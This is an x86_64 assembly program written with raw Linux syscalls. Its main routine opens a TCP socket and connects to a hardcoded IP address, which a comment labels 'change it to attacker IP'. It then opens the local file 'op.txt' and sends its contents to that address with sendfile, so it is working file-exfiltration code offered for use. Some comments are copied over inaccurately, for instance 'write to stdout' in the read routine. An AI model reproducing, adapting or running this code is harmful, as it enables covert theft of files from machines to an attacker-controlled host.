;arg x86_64        rdi   rsi   rdx   r10   r8    r9    -

section	.text
    	global _start

_start:
	jmp main


write:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	xor rdi,rdi
	mov rax, 1   ; use the write syscall
	mov rdi, 1   ; write to stdout
	mov rsi, [rbp+24] ; use string "Hello World"
	mov rdx, [rbp+16]  ; write 12 characters
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

read:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	xor rdi,rdi
	mov rax, 0   ; use the read syscall
	mov rdi, 1   ; write to stdout
	mov rsi, [rbp+24] ; use string "Hello World"
	mov rdx, [rbp+16]  ; write 12 characters
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

open:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	;xor rdi,rdi
	mov rax, 2   ; open syscall
	mov rdi, [rbp+24]   ; file desc
	mov rsi, [rbp+16] ; code
	mov rdx, 0  
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

socket:
	enter 0, 0
	mov rdx,6  ;tcp
	mov rsi, 1 ;SOCK_STREAM
	mov rdi, 2 ;AF_INET
	mov rax,41
	syscall
	leave
	ret

connect:
	enter 0, 0
	;struct sockaddr_in 16 bytes
	;sin_family 2 bytes
	;sin_port 2 bytes
	;sin_addr 4 bytes

	xor rax,rax
		
	mov rdi, [rbp+16]

	push rax
	push rax
	push rax

	mov [rsp],byte 2
	mov [rsp+2],word 0x818c ;0x8813 
	mov [rsp+4],dword 0x15f9be6d ;0x92bc0a4c ;0x0f01a8c0 ;change it to attacker IP
	
	mov rsi, rsp
	mov rdx, 16
	
	mov rax, 42
	syscall
	leave
	ret

sendfile:
	enter 0, 0
	mov rsi,[rbp+24] ;in_fd
	mov rdi,[rbp+16] ;out_fd
	cdq
	mov r10,884771
	xor rax,rax
	mov al,40
	syscall
	leave
	ret

exit:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	;xor rdi,rdi
	mov rax, 60  ; exit syscall
	mov rdi, [rbp+16]   ; 1
	xor rsi, rsi
	xor rdx, rdx  
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret

main:


	call socket
	mov r15, rax
	push rax
	call connect
	
	
	cmp rax, 0
	jl error
	push word 0x0A0D
	mov rsi, 's       '
	push rsi
	mov rsi, 'n Succes'
	push rsi
	mov rsi, 'Operatio'
	push rsi
	push rsp
	xor rdx,rdx
	add rdx,26
	push rdx
	call write
	;jmp end

	xor rdx, rdx
	push rdx
	mov rsi, 'op.txt'
	push rsi
	push rsp
	push 2
	call open
	
	push rax
	push r15
	call sendfile

	jmp end

error:
	push word 0x0A0D
	mov rsi, 'n ERROR '
	push rsi
	mov rsi, 'Operatio'
	push rsi
	push rsp
	xor rdx,rdx
	add rdx,18
	push rdx
	call write

end:


	push 1
	call exit












